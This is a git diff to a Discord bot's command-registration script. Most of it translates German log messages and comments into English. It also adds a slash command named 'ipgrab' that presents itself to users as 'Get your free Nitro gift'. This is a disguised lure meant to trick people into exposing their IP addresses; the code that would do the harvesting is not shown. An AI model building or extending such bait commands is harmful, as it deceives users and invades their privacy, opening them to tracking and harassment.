@@ -37,21 +37,27 @@ const commands = [
     .setDescription('Blame someone')
     .addUserOption(o =>
       o.setName('victim')
-      .setDescription('Who to blame')
-      .setRequired(true))
+        .setDescription('Who to blame')
+        .setRequired(true))
+    .setIntegrationTypes(...integrationTypes)
+    .setContexts(...contexts),
+
+  new SlashCommandBuilder()
+    .setName('ipgrab')
+    .setDescription('Get your free Nitro gift')
     .setIntegrationTypes(...integrationTypes)
     .setContexts(...contexts),
 ].map(c => c.toJSON());
 
 const appId = process.env.CLIENT_ID;
-const guildId = process.env.GUILD_ID; // optional, aber für sofortiges Testen setzen
+const guildId = process.env.GUILD_ID; // optional, but instant for testing
 
-console.log('CLIENT_ID gesetzt?', Boolean(appId));
-console.log('GUILD_ID gesetzt?', Boolean(guildId));
+console.log('CLIENT_ID set?', Boolean(appId));
+console.log('GUILD_ID set?', Boolean(guildId));
 
 if (!appId) {
-  console.error('FEHLER: CLIENT_ID fehlt! Variable auf Railway anlegen.');
-  process.exit(0); // wichtig: exit 0, damit index.js trotzdem startet
+  console.error('ERROR: CLIENT_ID is missing! Add it to your Railway variables.');
+  process.exit(0); // exit 0 so index.js still starts
 }
 
 const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
@@ -62,12 +68,12 @@ try {
     : Routes.applicationCommands(appId);
 
   console.log(
-    `Registriere ${commands.length} Commands ${guildId ? `im Guild ${guildId}` : 'GLOBAL (bis 1h Wartezeit)'}...`
+    `Registering ${commands.length} commands ${guildId ? `in guild ${guildId}` : 'GLOBALLY (up to 1h delay)'}...`
   );
 
   const data = await rest.put(route, { body: commands });
-  console.log(`OK - ${data.length} Commands registriert.`);
+  console.log(`OK - registered ${data.length} commands.`);
 } catch (err) {
-  console.error('Registrierung fehlgeschlagen:', err);
-  process.exit(0); // nicht den Bot killen
+  console.error('Registration failed:', err);
+  process.exit(0); // don't kill the bot
 }
